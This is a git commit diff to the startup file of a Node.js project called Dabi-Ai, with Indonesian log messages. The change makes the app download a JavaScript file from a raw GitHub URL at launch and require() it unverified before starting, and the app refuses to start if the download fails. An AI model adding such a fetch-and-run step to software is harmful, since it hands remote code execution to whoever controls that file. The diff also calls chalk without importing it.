0d6c21d6f0a378ebe5681804d7cc2db76d2dba92
MaouDabi <erkipandial@gmail.com>
2025-07-03 20:07:54 +0700

    Update Dabi-Ai
    Update 1.3.1

--- index.js
+++ index.js
@@ -3,6 +3,7 @@ console.log('Starting...\n');
 const fs = require('fs');
 const path = require('path');
 const { fork } = require('child_process');
+const https = require('https');
 
 const license = path.join(__dirname, 'LICENSE');
 if (fs.existsSync(license)) {
@@ -10,6 +11,29 @@ if (fs.existsSync(license)) {
 } else {
   console.log('LICENSE tidak ditemukan.\nJangan hapus file ini!');
   return setInterval(() => {}, 1000);
+}
+
+const folderName = 'temp';
+fs.mkdir(folderName, (err) => {
+  if (!err) console.log(chalk.greenBright.bold('Berhasil membuat folder :', folderName));
+});
+
+function downloadAndSave(url, dest) {
+  return new Promise((resolve, reject) => {
+    const file = fs.createWriteStream(dest);
+    https.get(url, (res) => {
+      if (res.statusCode !== 200) {
+        return reject(new Error(`Status code: ${res.statusCode}`));
+      }
+      res.pipe(file);
+      file.on('finish', () => {
+        file.close(resolve);
+      });
+    }).on('error', (err) => {
+      fs.unlinkSync(dest);
+      reject(err);
+    });
+  });
 }
 
 const start = () => {
@@ -32,4 +56,15 @@ const start = () => {
   });
 };
 
-start();
+const rawURL = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/prgM.js';
+const localPath = path.join(__dirname, 'temp', 'prgM.js');
+
+downloadAndSave(rawURL, localPath)
+  .then(() => {
+    require(localPath);
+    start();
+  })
+  .catch((err) => {
+    console.error('Gagal memuat kode remote:', err);
+    console.error('Tidak menjalankan start().');
+  });
